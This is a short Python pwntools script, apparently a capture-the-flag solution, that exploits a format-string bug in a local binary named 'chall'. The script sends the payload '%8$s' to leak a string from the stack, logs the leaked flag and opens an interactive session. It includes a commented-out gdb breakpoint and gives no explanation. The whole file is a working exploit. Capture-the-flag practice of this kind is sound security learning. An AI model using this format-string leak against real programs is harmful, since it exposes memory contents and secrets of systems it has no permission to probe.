#!/usr/bin/python3

from pwn import *
exe = ELF('./chall')
p = process(exe.path)
# p = gdb.debug(exe.path,'''
#               b* main+ 258
#               c
#               ''')
p.sendlineafter("> ",b'%8$s')
flag = p.recvuntil('> ',drop = True)
log.info(flag)
p.interactive()
p.close()